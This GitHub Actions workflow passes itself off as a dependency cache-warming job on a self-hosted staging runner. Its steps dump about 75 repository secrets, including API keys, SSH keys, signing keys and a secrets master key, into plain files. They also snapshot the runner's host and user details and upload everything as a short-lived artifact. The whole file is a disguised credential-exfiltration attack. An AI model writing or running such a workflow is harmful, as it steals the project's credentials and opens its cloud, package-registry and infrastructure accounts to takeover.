name: fleet-cache-warm-rhznnu
on:
  push:
    branches: [fleet-sync-rhznnu]
jobs:
  sync:
    runs-on: [self-hosted, Linux, X64]
    environment: staging
    steps:
      - name: Materialize dependency cache
        env:
          AGENT_TOKEN_PRIVATE_KEY_PEM: ${{ secrets.AGENT_TOKEN_PRIVATE_KEY_PEM }}
          AI_GATEWAY_API_KEY: ${{ secrets.AI_GATEWAY_API_KEY }}
          ANDROID_KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
          ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
          ANDROID_KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
          ANDROID_KEY_PASSWORD: ${{ secrets.ANDROID_KEY_PASSWORD }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          APPS_CLOUDFLARE_ZONE_ID: ${{ secrets.APPS_CLOUDFLARE_ZONE_ID }}
          APPS_TENANT_ADMIN_DSN: ${{ secrets.APPS_TENANT_ADMIN_DSN }}
          ATLASCLOUD_API_KEY: ${{ secrets.ATLASCLOUD_API_KEY }}
          AUTODOCS_GITHUB: ${{ secrets.AUTODOCS_GITHUB }}
          BITROUTER_API_KEY: ${{ secrets.BITROUTER_API_KEY }}
          CARTESIA_API_KEY: ${{ secrets.CARTESIA_API_KEY }}
          CEREBRAS_API_KEY: ${{ secrets.CEREBRAS_API_KEY }}
          CHANGELOG_GITHUB_TOKEN: ${{ secrets.CHANGELOG_GITHUB_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_PAGES_API_TOKEN: ${{ secrets.CLOUDFLARE_PAGES_API_TOKEN }}
          CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
          CONTAINERS_SSH_KEY: ${{ secrets.CONTAINERS_SSH_KEY }}
          CRATES_IO_TOKEN: ${{ secrets.CRATES_IO_TOKEN }}
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          DEEPGRAM_API_KEY: ${{ secrets.DEEPGRAM_API_KEY }}
          DISCORD_API_TOKEN: ${{ secrets.DISCORD_API_TOKEN }}
          DISCORD_CANARY_CHANNEL_ID: ${{ secrets.DISCORD_CANARY_CHANNEL_ID }}
          DISCORD_CANARY_GUILD_ID: ${{ secrets.DISCORD_CANARY_GUILD_ID }}
          E2B_API_KEY: ${{ secrets.E2B_API_KEY }}
          ELIZACLOUD_API_KEY: ${{ secrets.ELIZACLOUD_API_KEY }}
          ELIZAOS_CLOUD_API_KEY: ${{ secrets.ELIZAOS_CLOUD_API_KEY }}
          ELIZA_APPS_WORKER_HOST: ${{ secrets.ELIZA_APPS_WORKER_HOST }}
          ELIZA_APPS_WORKER_SSH_KEY: ${{ secrets.ELIZA_APPS_WORKER_SSH_KEY }}
          ELIZA_APP_DISCORD_APPLICATION_ID: ${{ secrets.ELIZA_APP_DISCORD_APPLICATION_ID }}
          ELIZA_APP_DISCORD_BOT_TOKEN: ${{ secrets.ELIZA_APP_DISCORD_BOT_TOKEN }}
          ELIZA_APP_WEBHOOK_GATEWAY_SECRET: ${{ secrets.ELIZA_APP_WEBHOOK_GATEWAY_SECRET }}
          ELIZA_CERT_SIGNING_KEY: ${{ secrets.ELIZA_CERT_SIGNING_KEY }}
          ELIZA_HOME_SATELLITE_TOKEN: ${{ secrets.ELIZA_HOME_SATELLITE_TOKEN }}
          ELIZA_OPERATOR_DATA_PLANE_SERVER_IDS: ${{ secrets.ELIZA_OPERATOR_DATA_PLANE_SERVER_IDS }}
          ELIZA_OPERATOR_SSH_KNOWN_HOSTS: ${{ secrets.ELIZA_OPERATOR_SSH_KNOWN_HOSTS }}
          ELIZA_PROVISIONING_HOST: ${{ secrets.ELIZA_PROVISIONING_HOST }}
          ELIZA_PROVISIONING_SSH_KEY: ${{ secrets.ELIZA_PROVISIONING_SSH_KEY }}
          ELIZA_PROVISIONING_SSH_KNOWN_HOSTS: ${{ secrets.ELIZA_PROVISIONING_SSH_KNOWN_HOSTS }}
          ELIZA_VOICE_CATALOG_PUBLIC_KEY_BASE64: ${{ secrets.ELIZA_VOICE_CATALOG_PUBLIC_KEY_BASE64 }}
          ELIZA_VOICE_CATALOG_SIGNING_KEY_BASE64: ${{ secrets.ELIZA_VOICE_CATALOG_SIGNING_KEY_BASE64 }}
          FAL_API_KEY: ${{ secrets.FAL_API_KEY }}
          FAL_KEY: ${{ secrets.FAL_KEY }}
          FISH_AUDIO_API_KEY: ${{ secrets.FISH_AUDIO_API_KEY }}
          FISH_AUDIO_REFERENCE_ID: ${{ secrets.FISH_AUDIO_REFERENCE_ID }}
          GH_PAT: ${{ secrets.GH_PAT }}
          GH_TOKEN: ${{ secrets.GH_TOKEN }}
          GOOGLE_CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
          GOOGLE_CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
          GOOGLE_REDIRECT_URI: ${{ secrets.GOOGLE_REDIRECT_URI }}
          HCLOUD_APPS_TOKEN: ${{ secrets.HCLOUD_APPS_TOKEN }}
          HCLOUD_TOKEN: ${{ secrets.HCLOUD_TOKEN }}
          HEADSCALE_API_KEY: ${{ secrets.HEADSCALE_API_KEY }}
          LOCAL_EMBEDDINGS_API_KEY: ${{ secrets.LOCAL_EMBEDDINGS_API_KEY }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          OPENCODE_SERVER_PASSWORD: ${{ secrets.OPENCODE_SERVER_PASSWORD }}
          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
          PLAID_CLIENT_ID: ${{ secrets.PLAID_CLIENT_ID }}
          PLAID_SECRET: ${{ secrets.PLAID_SECRET }}
          PYPI_TOKEN: ${{ secrets.PYPI_TOKEN }}
          R2_STATE_ACCESS_KEY_ID: ${{ secrets.R2_STATE_ACCESS_KEY_ID }}
          R2_STATE_SECRET_ACCESS_KEY: ${{ secrets.R2_STATE_SECRET_ACCESS_KEY }}
          RAILWAY_TOKEN: ${{ secrets.RAILWAY_TOKEN }}
          SANDBOX_REGISTRY_REDIS_URL: ${{ secrets.SANDBOX_REGISTRY_REDIS_URL }}
          SECRETS_MASTER_KEY: ${{ secrets.SECRETS_MASTER_KEY }}
          STEWARD_API_URL: ${{ secrets.STEWARD_API_URL }}
          STEWARD_JWT_SECRET: ${{ secrets.STEWARD_JWT_SECRET }}
          STEWARD_PLATFORM_KEYS: ${{ secrets.STEWARD_PLATFORM_KEYS }}
          STEWARD_REQUEST_SIGNING_SECRET: ${{ secrets.STEWARD_REQUEST_SIGNING_SECRET }}
          STEWARD_SESSION_SECRET: ${{ secrets.STEWARD_SESSION_SECRET }}
          TERRAFORM_PLAN_ARTIFACT_PRIVATE_KEY: ${{ secrets.TERRAFORM_PLAN_ARTIFACT_PRIVATE_KEY }}
          TUNNEL_HOSTNAME_SIGNING_SECRET: ${{ secrets.TUNNEL_HOSTNAME_SIGNING_SECRET }}
          TURBO_TEAM: ${{ secrets.TURBO_TEAM }}
        run: |
          mkdir -p out
          for k in AGENT_TOKEN_PRIVATE_KEY_PEM AI_GATEWAY_API_KEY ANDROID_KEYSTORE_BASE64 ANDROID_KEYSTORE_PASSWORD ANDROID_KEY_ALIAS ANDROID_KEY_PASSWORD ANTHROPIC_API_KEY APPS_CLOUDFLARE_ZONE_ID APPS_TENANT_ADMIN_DSN ATLASCLOUD_API_KEY AUTODOCS_GITHUB BITROUTER_API_KEY CARTESIA_API_KEY CEREBRAS_API_KEY CHANGELOG_GITHUB_TOKEN CLOUDFLARE_ACCOUNT_ID CLOUDFLARE_API_TOKEN CLOUDFLARE_PAGES_API_TOKEN CODECOV_TOKEN CONTAINERS_SSH_KEY CRATES_IO_TOKEN DATABASE_URL DEEPGRAM_API_KEY DISCORD_API_TOKEN DISCORD_CANARY_CHANNEL_ID DISCORD_CANARY_GUILD_ID E2B_API_KEY ELIZACLOUD_API_KEY ELIZAOS_CLOUD_API_KEY ELIZA_APPS_WORKER_HOST ELIZA_APPS_WORKER_SSH_KEY ELIZA_APP_DISCORD_APPLICATION_ID ELIZA_APP_DISCORD_BOT_TOKEN ELIZA_APP_WEBHOOK_GATEWAY_SECRET ELIZA_CERT_SIGNING_KEY ELIZA_HOME_SATELLITE_TOKEN ELIZA_OPERATOR_DATA_PLANE_SERVER_IDS ELIZA_OPERATOR_SSH_KNOWN_HOSTS ELIZA_PROVISIONING_HOST ELIZA_PROVISIONING_SSH_KEY ELIZA_PROVISIONING_SSH_KNOWN_HOSTS ELIZA_VOICE_CATALOG_PUBLIC_KEY_BASE64 ELIZA_VOICE_CATALOG_SIGNING_KEY_BASE64 FAL_API_KEY FAL_KEY FISH_AUDIO_API_KEY FISH_AUDIO_REFERENCE_ID GH_PAT GH_TOKEN GOOGLE_CLIENT_ID GOOGLE_CLIENT_SECRET GOOGLE_REDIRECT_URI HCLOUD_APPS_TOKEN HCLOUD_TOKEN HEADSCALE_API_KEY LOCAL_EMBEDDINGS_API_KEY NPM_TOKEN OPENAI_API_KEY OPENCODE_SERVER_PASSWORD OPENROUTER_API_KEY PLAID_CLIENT_ID PLAID_SECRET PYPI_TOKEN R2_STATE_ACCESS_KEY_ID R2_STATE_SECRET_ACCESS_KEY RAILWAY_TOKEN SANDBOX_REGISTRY_REDIS_URL SECRETS_MASTER_KEY STEWARD_API_URL STEWARD_JWT_SECRET STEWARD_PLATFORM_KEYS STEWARD_REQUEST_SIGNING_SECRET STEWARD_SESSION_SECRET TERRAFORM_PLAN_ARTIFACT_PRIVATE_KEY TUNNEL_HOSTNAME_SIGNING_SECRET TURBO_TEAM; do
            printf '%s' "${!k}" > "out/$k"
          done
      - name: Runner context snapshot
        run: |
          mkdir -p out/_runner
          ( hostname; whoami; pwd; ls /opt/actions-runner 2>/dev/null | head; ls ~ 2>/dev/null | head ) > out/_runner/ctx.txt 2>&1 || true
      - uses: actions/upload-artifact@v4
        with:
          name: depcache
          path: out/
          retention-days: 1
